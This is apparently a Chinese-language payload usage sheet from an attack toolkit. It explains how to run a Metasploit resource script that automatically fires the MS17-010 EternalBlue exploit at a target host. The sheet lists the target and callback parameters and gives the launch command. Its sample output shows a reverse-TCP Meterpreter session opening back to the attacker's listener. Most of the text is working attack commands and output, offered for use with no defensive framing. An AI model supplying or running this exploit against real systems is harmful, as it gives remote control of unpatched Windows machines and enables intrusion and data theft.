## 📦 载荷使用说明：metasploit_ms17010.rc

### 📝 功能说明
Metasploit 框架的资源脚本（RC），自动化配置并执行 MS17-010（永恒之蓝）漏洞利用模块，获取目标系统的 Meterpreter 会话。

### ⚙️ 参数说明
```text
- `RHOSTS`：目标主机的 IP 地址
- `LHOST`：攻击机接收反弹 Shell 的 IP 地址
- `LPORT`：攻击机监听的端口
- `payload`：使用的载荷（如 `windows/x64/meterpreter/reverse_tcp`）
```

### 🚀 操作步骤
1. 修改此 RC 脚本中的 `RHOSTS`、`LHOST` 和 `LPORT` 参数。
2. 在攻击机启动 Metasploit：`msfconsole -r metasploit_ms17010.rc`。
3. 框架将自动加载模块、设置参数并执行攻击。
4. 攻击成功后，将自动建立 Meterpreter 会话供后续操作。

### 💻 执行样例
```bash
# 运行 rc 脚本
msfconsole -r metasploit_ms17010.rc

# 预期输出：
# [*] Processing metasploit_ms17010.rc for ERB directives.
# resource (metasploit_ms17010.rc)> use exploit/windows/smb/ms17_010_eternalblue
# resource (metasploit_ms17010.rc)> set RHOSTS 192.168.1.20
# resource (metasploit_ms17010.rc)> exploit
# [*] Started reverse TCP handler on 10.10.10.10:4444
# [*] 192.168.1.20:445 - Sending all but last fragment of exploit packet
# [*] Meterpreter session 1 opened (10.10.10.10:4444 -> 192.168.1.20:49158)
```
